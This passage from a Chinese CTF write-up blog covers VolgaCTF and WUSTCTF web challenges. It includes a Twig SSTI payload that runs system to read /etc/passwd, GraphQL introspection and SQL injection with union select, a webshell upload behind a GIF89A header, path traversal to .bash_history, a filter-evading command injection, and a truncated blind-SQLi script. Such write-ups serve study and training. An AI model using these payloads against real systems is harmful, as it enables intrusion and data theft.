alt></p><h2 id="Newsletter"><a href="#Newsletter" class="headerlink" title="Newsletter"></a>Newsletter</h2><p>这题网上找不到免费的能收邮件的服务器，应该是要个SMTP的。没办法只能学学Twig打ssti的用法了。<br>题目首先给出看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Bundle</span>\<span class="title">FrameworkBundle</span>\<span class="title">Controller</span>\<span class="title">AbstractController</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">HttpFoundation</span>\<span class="title">Response</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">HttpFoundation</span>\<span class="title">Request</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Mailer</span>\<span class="title">MailerInterface</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Mime</span>\<span class="title">Email</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MainController</span> <span class="keyword">extends</span> <span class="title">AbstractController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">(Request $request)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;render(<span class="string">'main.twig'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">subscribe</span><span class="params">(Request $request, MailerInterface $mailer)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">      $msg = <span class="string">''</span>;</span><br><span class="line">      $email = filter_var($request-&gt;request-&gt;get(<span class="string">'email'</span>, <span class="string">''</span>), FILTER_VALIDATE_EMAIL);</span><br><span class="line">      <span class="keyword">if</span>($email !== <span class="keyword">FALSE</span>) &#123;</span><br><span class="line">        $name = substr($email, <span class="number">0</span>, strpos($email, <span class="string">'@'</span>));</span><br><span class="line"></span><br><span class="line">        $content = <span class="keyword">$this</span>-&gt;get(<span class="string">'twig'</span>)-&gt;createTemplate(</span><br><span class="line">          <span class="string">"&lt;p&gt;Hello $&#123;name&#125;.&lt;/p&gt;&lt;p&gt;Thank you for subscribing to our newsletter.&lt;/p&gt;&lt;p&gt;Regards, VolgaCTF Team&lt;/p&gt;"</span></span><br><span class="line">        )-&gt;render();</span><br><span class="line"></span><br><span class="line">        $mail = (<span class="keyword">new</span> Email())-&gt;from(<span class="string">'newsletter@newsletter.q.2020.volgactf.ru'</span>)-&gt;to($email)-&gt;subject(<span class="string">'VolgaCTF Newsletter'</span>)-&gt;html($content);</span><br><span class="line">        $mailer-&gt;send($mail);</span><br><span class="line"></span><br><span class="line">        $msg = <span class="string">'Success'</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = <span class="string">'Invalid email'</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;render(<span class="string">'main.twig'</span>, [<span class="string">'msg'</span> =&gt; $msg]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">source</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Response(<span class="string">'&lt;pre&gt;'</span>.htmlspecialchars(file_get_contents(<span class="keyword">__FILE__</span>)).<span class="string">'&lt;/pre&gt;'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先不用说，<code>${name}</code>这里存在ssti的。同时确认是twig模板的。<br><code>$email = filter_var($request-&gt;request-&gt;get(&#39;email&#39;, &#39;&#39;), FILTER_VALIDATE_EMAIL);</code><br>这句过滤很好绕，只需要<code>6@domain.tld</code>就可以在收清求的地方看到ssti的效果了。<br>flag在etc/passwd中<br>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&#123;&#123;[&#39;cat$&#123;IFS&#125;&#x2F;etc&#x2F;passwd&#39;]|filter(&#39;system&#39;)&#125;&#125;&quot;@y</span><br></pre></td></tr></table></figure><p>因为没法亲自动手所以只好搬运payload了，惭愧…</p><h2 id="Library"><a href="#Library" class="headerlink" title="Library"></a>Library</h2><p>在注册时可以抓包发现/api的路由<br><img src="https://upload-images.jianshu.io/upload_images/18060177-7730cfea600e9d6a.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p>根据传输及返回形式，可以判断出是GrpahQL的api接口,同时也有个经典的利用，就是传<code>{__schema{types{name}}}</code>,可以通过__schema查询所有可用对象：<br>尝试直接访问无果，post传值<code>{&quot;query&quot;:&quot;{ __schema { types { name } } }&quot;}</code><br>(这里要稍微根据之前传值的方式构造一下)</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"data"</span>:&#123;<span class="attr">"__schema"</span>:&#123;<span class="attr">"types"</span>:[&#123;<span class="attr">"name"</span>:<span class="string">"Query"</span>&#125;,&#123;<span class="attr">"name"</span>:<span class="string">"String"</span>&#125;,&#123;<span class="attr">"name"</span>:<span class="string">"LoginUser"</span>&#125;,&#123;<span class="attr">"name"</span>:<span class="string">"LoginResponse"</span>&#125;,&#123;<span class="attr">"name"</span>:<span class="string">"UserFilter"</span>&#125;,&#123;<span class="attr">"name"</span>:<span class="string">"User"</span>&#125;,&#123;<span class="attr">"name"</span>:<span class="string">"Book"</span>&#125;,&#123;<span class="attr">"name"</span>:<span class="string">"Mutation"</span>&#125;,&#123;<span class="attr">"name"</span>:<span class="string">"RegisterUser"</span>&#125;,&#123;<span class="attr">"name"</span>:<span class="string">"__Schema"</span>&#125;,&#123;<span class="attr">"name"</span>:<span class="string">"__Type"</span>&#125;,&#123;<span class="attr">"name"</span>:<span class="string">"__TypeKind"</span>&#125;,&#123;<span class="attr">"name"</span>:<span class="string">"Boolean"</span>&#125;,&#123;<span class="attr">"name"</span>:<span class="string">"__Field"</span>&#125;,&#123;<span class="attr">"name"</span>:<span class="string">"__InputValue"</span>&#125;,&#123;<span class="attr">"name"</span>:<span class="string">"__EnumValue"</span>&#125;,&#123;<span class="attr">"name"</span>:<span class="string">"__Directive"</span>&#125;,&#123;<span class="attr">"name"</span>:<span class="string">"__DirectiveLocation"</span>&#125;]&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>使用如下payload可以一个个的爆出我们可能可以利用的schema的信息<br><code>{&quot;query&quot;:&quot;{ __type(name: \&quot;User\&quot;) { name fields { name type { name kind }}}}&quot;}</code></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"data"</span>:&#123;<span class="attr">"__type"</span>:&#123;<span class="attr">"name"</span>:<span class="string">"User"</span>,<span class="attr">"fields"</span>:[&#123;<span class="attr">"name"</span>:<span class="string">"login"</span>,<span class="attr">"type"</span>:&#123;<span class="attr">"name"</span>:<span class="string">"String"</span>,<span class="attr">"kind"</span>:<span class="string">"SCALAR"</span>&#125;&#125;,&#123;<span class="attr">"name"</span>:<span class="string">"name"</span>,<span class="attr">"type"</span>:&#123;<span class="attr">"name"</span>:<span class="string">"String"</span>,<span class="attr">"kind"</span>:<span class="string">"SCALAR"</span>&#125;&#125;,&#123;<span class="attr">"name"</span>:<span class="string">"email"</span>,<span class="attr">"type"</span>:&#123;<span class="attr">"name"</span>:<span class="string">"String"</span>,<span class="attr">"kind"</span>:<span class="string">"SCALAR"</span>&#125;&#125;]&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>这就告诉我们，User object有三个Field.login, name ,email.同理我们爆下其他的,比如重点关注的Query<br>回显：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;data&quot;:&#123;&quot;__type&quot;:&#123;&quot;name&quot;:&quot;Query&quot;,&quot;fields&quot;:[&#123;&quot;name&quot;:&quot;_empty&quot;,&quot;type&quot;:&#123;&quot;name&quot;:&quot;String&quot;,&quot;kind&quot;:&quot;SCALAR&quot;&#125;&#125;,&#123;&quot;name&quot;:&quot;login&quot;,&quot;type&quot;:&#123;&quot;name&quot;:&quot;LoginResponse&quot;,&quot;kind&quot;:&quot;OBJECT&quot;&#125;&#125;,&#123;&quot;name&quot;:&quot;testGetUsersByFilter&quot;,&quot;type&quot;:&#123;&quot;name&quot;:null,&quot;kind&quot;:&quot;LIST&quot;&#125;&#125;,&#123;&quot;name&quot;:&quot;books&quot;,&quot;type&quot;:&#123;&quot;name&quot;:null,&quot;kind&quot;:&quot;LIST&quot;&#125;&#125;]&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>发现一个testGetUsersByFilter,似乎很有意思。也许它对可注的点进行了过滤,但这就意味着我们可以进行注入。<br>于是我们进行基本的查询。此时目标应该是sql注入，寻找可注点。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"query"</span>:<span class="string">"query testGetUsersByFilter($input: UserFilter) &#123;\n  testGetUsersByFilter(filter: $input) &#123;\n  login email name \n  &#125;\n&#125;\n"</span>,<span class="attr">"variables"</span>:&#123;<span class="attr">"input"</span>:&#123;<span class="attr">"login"</span>:<span class="string">"test"</span>,<span class="attr">"email"</span>:<span class="string">"test"</span>,<span class="attr">"name"</span>:<span class="string">"test"</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>构造这样一个查询语句。此时我们需要通过控制login email,name的值来测试是否存在注入</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"query"</span>:<span class="string">"query testGetUsersByFilter($input: UserFilter) &#123;\n  testGetUsersByFilter(filter: $input) &#123;\n  login email name \n  &#125;\n&#125;\n"</span>,<span class="attr">"variables"</span>:&#123;<span class="attr">"input"</span>:&#123;<span class="attr">"login"</span>:<span class="string">"'"</span>,<span class="attr">"email"</span>:<span class="string">"1231321"</span>,<span class="attr">"name"</span>:<span class="string">"3213"</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>当尝试sql注入常见的单引号时，发现返回的结果对应的login居然是空的。所以看来单引号被过滤了。但这并不是什么问题。因为逃逸单引号也是个考烂的trick了。</p><p>将我们传参部分input的值改为：<code>{&quot;login&quot;:&quot;test\\&quot;,&quot;name&quot;:&quot; union select * from users -- &quot;}</code><br>发现将返回所有用户名。至此sql注入已经确认可注，接下来就是挖掘信息了。<br>先order by 测字段数，发现是6个<br><img src="https://upload-images.jianshu.io/upload_images/18060177-5d9034306364e75c.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p>然后执行查询，发现回显字段是2,6,5<br><code>union select 1,table_name,3,4,5,6 from information_schema.tables where table_schema=database()#</code><br>发现flag表,flag列，查询即可<br><img src="https://upload-images.jianshu.io/upload_images/18060177-b852135e54ac4de8.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WEB </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WUSTCTF&amp;MRCTF部分web题解</title>
      <link href="2020/03/29/WUSTCTF&amp;MRCTF%E9%83%A8%E5%88%86web%E9%A2%98%E8%A7%A3/"/>
      <url>2020/03/29/WUSTCTF&amp;MRCTF%E9%83%A8%E5%88%86web%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<p>这周末顺手打了下两个新生赛。本来不想写wp的,但是想到上周BJD比赛的wp也没写就想着还是补着吧。（上周BJD不写是因为对比赛题目心里有意见，说是新生赛，脑洞跟套娃题把一堆老手都整得不舒服。当时差一道ASP.NET,因为ysoserial的gadget用的不对就一直出不了结果，直接心态搞崩）所以这次把这两个新生赛题目写写。具体只大致讲下思路吧</p><a id="more"></a><h1 id="WUSTCTF"><a href="#WUSTCTF" class="headerlink" title="WUSTCTF"></a>WUSTCTF</h1><p>很有意思，题目里php难度都比较基础。java难度就不一样了，估计是java接触的少的原因吧。</p><h2 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h2><p>进去一个前端验证。限制按钮跟长度。前端把按钮解决后抓个包传出题人名字就好，得到出题人blog<br>(老实说恶意引流不好吧……)<br>可以在博客前端看到部分flag，但是只有一半，后一半通过博客链接到github去,可以找到后半部分</p><h2 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h2><p>开始随手一个万能密码<code>admin&#39; or 1=1#</code>就进去了。<br><code>/adddddddddddddddddddddddminnnnnnnnnnnnnnnnnnnnnn.php</code><br>然后就是改header以及get，post值即可<br>得到paste.ubuntu分段给出的网页链接，找到正确的即可得到编码后的flag。解码即可</p><h2 id="CV-Maker"><a href="#CV-Maker" class="headerlink" title="CV Maker"></a>CV Maker</h2><p>基础上传,登录注册后先上传一个php,报的是exif_imagetype()检查。那就只要文件头解决就好了，传一个马<br>,前面加上GIF89A即可。<br>(这里还有uploads的目录遍历,随便一个都是现成的参考案例)<br>蚁剑连接后根目录<code>/readflag</code>即可。</p><h2 id="easyweb"><a href="#easyweb" class="headerlink" title="easyweb"></a>easyweb</h2><p>这题是道java题。我用非预期做出来的。毕竟自己java知识有限……</p><p>首先进去又是个上传，传一个文件上去看到爆出一个download路由与file参数<br><img src="/2020/03/29/WUSTCTF&MRCTF%E9%83%A8%E5%88%86web%E9%A2%98%E8%A7%A3/0.PNG" alt><br>那就有任意文件下载<br>java题必读的几个配置文件,首先就是WEB-INF下的web.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">context-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>webAppRootKey<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>tomcat.ajp<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">context-param</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">listener</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">listener-class</span>&gt;</span></span><br><span class="line">            org.springframework.web.util.WebAppRootListener</span><br><span class="line">        <span class="tag">&lt;/<span class="name">listener-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">listener</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">welcome-file-list</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">welcome-file</span>&gt;</span>/WEB-INF/views/index.jsp<span class="tag">&lt;/<span class="name">welcome-file</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">welcome-file-list</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">error-page</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">exception-type</span>&gt;</span>java.lang.Throwable<span class="tag">&lt;/<span class="name">exception-type</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">location</span>&gt;</span>/error<span class="tag">&lt;/<span class="name">location</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">error-page</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure><p>只有一个index.jsp,同样下载后发现没什么内容。<br>这时开始尝试读取其他文件，构造后发现可以读取到/etc/passwd</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">_apt:x:100:65534::/nonexistent:/bin/<span class="literal">false</span></span><br><span class="line">messagebus:x:101:102::/var/run/dbus:/bin/<span class="literal">false</span></span><br><span class="line">sshd:x:102:65534::/run/sshd:/usr/sbin/nologin</span><br><span class="line">systemd-timesync:x:103:104:systemd Time Synchronization,,,:/run/systemd:/bin/<span class="literal">false</span></span><br><span class="line">systemd-network:x:104:105:systemd Network Management,,,:/run/systemd/netif:/bin/<span class="literal">false</span></span><br><span class="line">systemd-resolve:x:105:106:systemd Resolver,,,:/run/systemd/resolve:/bin/<span class="literal">false</span></span><br><span class="line">systemd-bus-proxy:x:106:107:systemd Bus Proxy,,,:/run/systemd:/bin/<span class="literal">false</span></span><br><span class="line">tomajp:x:1000:1000::/home/tomajp:/bin/bash</span><br></pre></td></tr></table></figure><p>有意思的是,我们题目起的tomajp用户的家目录是 bin/bash.这点让我想起了之前做网鼎杯Comment这道题的一个收获：<br>二次注入,数据库却没有flag,通过读取.bash_history发现了其他文件夹中未删除的flag从而读取。<br>那么本题尝试读取<code>/home/tomajp/.bash_history</code><br><img src="/2020/03/29/WUSTCTF&MRCTF%E9%83%A8%E5%88%86web%E9%A2%98%E8%A7%A3/1.PNG" alt><br>发现有蹊跷，拖到下面有发现<br><img src="/2020/03/29/WUSTCTF&MRCTF%E9%83%A8%E5%88%86web%E9%A2%98%E8%A7%A3/2.PNG" alt><br>根据这里记录的操作可以看到，flag应该是在根目录的flaaaag文件夹下的what_you_want<br>直接读取即可<br><code>/download?file=../../../../../../../../../flaaaag/what_you_want</code><br><img src="/2020/03/29/WUSTCTF&MRCTF%E9%83%A8%E5%88%86web%E9%A2%98%E8%A7%A3/3.PNG" alt></p><p>问了下官方,的确是个比较简单的非预期,预期解是上传jsp进行RCE.但是我一直没弄明白tomcat里上传目录要怎么访问，这个可能是吃了不熟悉javaweb<br>的锅。不说了，之前说好要学javaweb也得提上日程了。<br>ps:赛后了解到是ghostcat打。这个就很有趣了，因为同期的另一个国际赛有题也是这个幽灵猫。找时间等buu上靶机了复现下这个洞。<br>不用等了，直接看我下一篇文章即可。做一个脚本小子，ghostcat利用还是不难的。</p><h2 id="朴实无华"><a href="#朴实无华" class="headerlink" title="朴实无华"></a>朴实无华</h2><p>先放一个没拿到一血的原因<br><img src="/2020/03/29/WUSTCTF&MRCTF%E9%83%A8%E5%88%86web%E9%A2%98%E8%A7%A3/4.PNG" alt><br>手慢一步加上出题人权限没控好,直接flag被删了。导致我多花了半个小时,找出题人沟通后好了。不过说到底慢一步flag被删还是因为只有二血的手速……</p><p>首先是信息收集，这里奇怪的一点是<code>/.git/</code>目录直接暴露在外了,但是仔细观察下发现只是个lamp的git.不知道是不是为了混淆视听故意放的。反正我是githack用了几次才察觉不对劲的。</p><p>个人信息收集一直是手测,测了好多源码泄露没反应后注意到index.php网页的标题为bot。于是考虑robots.txt，发现了<code>fAke_f1agggg.php</code><br>访问后当然没有真flag，但是header里有<code>fl4g.php</code>，得到题目源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">'Content-type:text/html;charset=utf-8'</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//level 1</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    $num = $_GET[<span class="string">'num'</span>];</span><br><span class="line">    <span class="keyword">if</span>(intval($num) &lt; <span class="number">2020</span> &amp;&amp; intval($num + <span class="number">1</span>) &gt; <span class="number">2021</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"金钱解决不了穷人的本质问题"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"去非洲吧"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//level 2</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'md5'</span>]))&#123;</span><br><span class="line">   $md5=$_GET[<span class="string">'md5'</span>];</span><br><span class="line">   <span class="keyword">if</span> ($md5==md5($md5))</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">"想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;"</span>;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">       <span class="keyword">die</span>(<span class="string">"我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲"</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"去非洲吧"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//get flag</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'get_flag'</span>]))&#123;</span><br><span class="line">    $get_flag = $_GET[<span class="string">'get_flag'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!strstr($get_flag,<span class="string">" "</span>))&#123;</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"cat"</span>, <span class="string">"wctf2020"</span>, $get_flag);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;"</span>;</span><br><span class="line">        system($get_flag);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"快到非洲了"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"去非洲吧"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>老套娃了。<br>第一层一个intval的问题。<br>这里使用的是一个进制的技巧，比如2020的16进制7e4<br>intval会将字符串7e4认作7,而intval(“7e4”+1)则被类型转换，变为70001</p><p>第二层弱类型比较的问题<br><code>$md5==md5($md5)</code><br>但是原来校赛总结时就强调过，网上一直以来的说法很不准确。并非是0e开头才会被判作0.而是因为0e开头且纯数字然后才能被转为0<br><a href="https://www.jianshu.com/p/52f04f85824e" target="_blank" rel="noopener">https://www.jianshu.com/p/52f04f85824e</a><br>故我们需要0e开头纯数字的数，使得其MD5值0e开头且纯数字。<br>因此这个一定是要脚本跑的，所以我选择放弃hhh。找队友要了以前讲过这个trick的文章，得到了这个神奇数字0e215962017</p><p>第三层基础至极。<code>ca\t</code>可以绕过关键字，<code>${IFS}</code>替代空格，读flag可以直接用<code>fll*</code>，或者直接cat <code>cat `ls`</code> 即可。<br>主要还是被人搅屎导致多试了好久,还顺便打算弹shell。结果试了5种方法都没成,真的气人<br>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num&#x3D;7e4&amp;md5&#x3D;0e215962017&amp;get_flag&#x3D;ca\t$&#123;IFS&#125;&#96;ls&#96;</span><br></pre></td></tr></table></figure><h2 id="颜值成绩查询"><a href="#颜值成绩查询" class="headerlink" title="颜值成绩查询"></a>颜值成绩查询</h2><p>裸的数值布尔盲注，直接上if分流就完事。<br>好像过滤了空格，那就括号多套一下。<br>因为打错了参数<code>stunum</code>，导致只拿到三血。气死了…以后一定直接复制粘贴url。吃大亏。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">url=<span class="string">'http://101.200.53.102:10114/index.php?stunum='</span></span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    print(i)</span><br><span class="line">    <span class="keyword">for</span> str1 <span class="keyword">in</span> <span 